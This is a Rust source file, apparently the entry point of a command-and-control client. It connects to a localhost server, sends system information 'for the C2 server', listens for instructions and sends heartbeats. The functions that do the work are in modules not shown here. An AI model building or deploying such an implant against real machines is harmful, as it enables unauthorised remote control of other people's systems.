use std::io::{self};
use std::net::TcpStream;
use std::thread;
use crate::worker::utils::{send_heartbeat_loop, listening_for_instructions, send_sys_info};

mod config;
mod worker;

/// Entry point for the client application.
///
/// Establishes a connection to the server and initializes the main
/// functionalities of the client, including sending system information to the
/// server, listening for instructions, and continuously sending heartbeats.
///
/// # Returns
///
/// Returns `io::Result<()>` to indicate the success or failure of the operation.
///
/// # Errors
///
/// This function will return an error if the connection to the server fails or
/// if there are issues sending system information, listening for instructions,
/// or sending heartbeats.
fn main() -> io::Result<()> {
    let ip = "127.0.0.1".to_string();
    let port = "49151".to_string();
    let mut stream = TcpStream::connect(format!("{}:{}", ip, port))?;
    println!("[I] Connected to server {}:{}.", ip, port);

    // Send basic sysinfo for the C2 server
    send_sys_info(&mut stream);

    listening_for_instructions(&mut stream).unwrap();

    thread::spawn(move || {
        send_heartbeat_loop(&mut stream)
    }).join().unwrap();
    Ok(())
}

